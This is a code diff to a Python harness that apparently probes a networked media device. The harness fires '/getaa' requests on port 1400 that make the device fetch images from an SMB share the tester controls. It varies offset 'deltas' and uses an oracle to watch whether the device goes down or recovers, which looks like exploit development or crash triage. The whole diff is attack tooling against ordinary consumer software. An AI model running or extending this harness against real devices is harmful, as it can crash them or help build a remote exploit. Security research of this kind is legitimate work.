@@ -55,13 +55,13 @@ def start_harness(delta):
     for _ in range(80):
         r = subprocess.run("sudo -n lsof -ti :445", shell=True, capture_output=True, text=True)
         if r.stdout.strip():
-            time.sleep(0.4)
+            time.sleep(1.5)
             return
         time.sleep(0.1)
 
 
-def fire(host, timeout=25):
-    url = (f"http://{host}:1400/getaa?u=x-file-cifs://{SHARE_HOST}/S/real.jpg&w=64&h=64")
+def fire(host, name="real.jpg", timeout=25):
+    url = (f"http://{host}:1400/getaa?u=x-file-cifs://{SHARE_HOST}/S/{name}&w=64&h=64")
     t0 = time.monotonic()
     r = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                         "--max-time", str(timeout), url], capture_output=True, text=True)
@@ -96,7 +96,7 @@ def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--host", default="192.168.4.202")
     ap.add_argument("--deltas", default="0,0x100,0x400,0x1000,0xffff")
-    ap.add_argument("--settle", type=float, default=6.0,
+    ap.add_argument("--settle", type=float, default=30.0,
                     help="seconds to keep watching after the request returns")
     ap.add_argument("--jsonl")
     ap.add_argument("--share-host", default=None,
@@ -111,7 +111,7 @@ def main():
         o = Oracle(a.host)
         o.start()
         time.sleep(0.5)
-        code, dt = fire(a.host)
+        code, dt = fire(a.host, f"f{d}.jpg")
         end = time.monotonic() + a.settle
         while time.monotonic() < end and o.up_at is None:
             time.sleep(0.1)
